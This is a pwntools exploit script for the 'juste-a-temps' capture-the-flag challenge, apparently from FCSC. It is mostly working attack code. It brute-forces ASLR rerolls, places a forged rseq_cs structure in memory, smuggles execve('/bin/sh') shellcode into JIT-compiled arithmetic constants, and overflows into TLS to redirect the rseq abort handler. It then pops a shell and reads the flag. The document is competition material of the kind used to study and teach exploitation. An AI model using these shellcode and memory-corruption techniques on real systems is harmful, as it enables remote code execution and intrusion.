from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = './juste-a-temps'
exe_args = []
PREFIX = (b": ", b"> ", b"expression\n")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    hb* 0x5555555553fd
    #hb* 0x555555555428
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'chall.fcsc.fr'
    port = args.PORT if args.PORT else 2111
    io = remote(host, port)

def launch_docker():
    global file, io
    io = remote("localhost", 4000)
    sleep(speed)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "^juste-a-temps$"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    i = 0
    prog = log.progress("rerolls")
    while True:
        prog.status(hex(i))
        recvu(b"@ ")
        rwx = int(recvu(b"\n", True), 16)
        rseq_cs = rwx - 0x21000 + 0x10 + 0x10000
        if ((rwx>>24)&0xffff) == 0xb848: # 2 fixed bytes
            if (rseq_cs >> 23) & 1 == 0: # 1 fixed bit (because of emit_push())
                break
        i += 1
        sl(b"clear") # reroll aslr
    printx(jit=rwx, rseqcs=rseq_cs)
    sl(b"")

    def interact(data):
        if type(data) == str:
            data = data.encode()
        sla(b"\n", data)
        sleep(speed)

    # getline will need a big chunk -> malloc will use mmap
    interact(f"A"*0x20000)
    # prepare rseq_cs struct
    payload = flat([
        0, # environ & flags (needs to be 0)
        rwx+0x10000, # critical section start
        0x200000, # critical section size
        rwx+2+4, # abort handler
    ])
    interact(b"A"*0x10000 + payload) # put it far away so our next input doesn't break it


    # code used to generate the shellcode
#     code = """
# mov ebx, 0
# xor eax, eax
# mov ebx, 0x0068732f
# shl rbx, 32
# mov ecx, 0x6e69622f
# or rbx, rcx
# push rbx
# mov rdi, rsp
# xor esi, esi
# xor edx, edx
# push 0x3b   
# pop rax
# syscall
# """

    # code = [asm(c) for c in code.splitlines()]
    # jmp = b"\xeb\x03" # jmp 5
    # parts = [b""]
    # for c in code:
    #     p = parts[-1]
    #     if len(p) + len(c) > 6:
    #         parts[-1] = p.ljust(6, b"\x90") + jmp
    #         parts.append(c)
    #     else:
    #         parts[-1] += c
    # parts[-1] = p.ljust(6, b"\x90") + jmp
    # numbers = [u64(p) for p in parts]
    
    # print(numbers)

    numbers = [
        0x03eb909053053053,
        0x03eb90909090c031,
        0x03eb900068732fbb,
        0x03eb909020e3c148,
        0x03eb906e69622fb9,
        0x03eb909053cb0948,
        0x03eb90f631e78948,
        0x03eb90583b6ad231,
        0x03eb90909090050f,
    ]

    payload = b""
    for n in numbers:
        payload += str(n).encode() + b"+("
    payload += b"0" + b")"*len(numbers)

    # roughly overflow into tls
    payload2 = "+9999999999"*3943
    # close to our target, be more precise
    # push char = 2
    # push int = 5
    # push long = 11
    payload2 += f"+({0x12345678}"*4 # 4 ints (20)
    # 23 lower bit of rseq_cs here
    payload2 += f"+({(rseq_cs & 0x7fffff)<<8}" # int
    # sreq->flags also needs to be 0, use a push64 for that
    # 24 upper bit of rseq_cs here
    # 17 fixed bits -> 1/0x20000 bruteforce
    payload2 += f"+({0xaa00000000000000 | (rseq_cs >> 40)}" # long
    payload2 += ")"*4 + "))"
    interact(payload + payload2.encode())

    success("shell")
    sleep(3)
    sl(b"cat flag.txt")

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
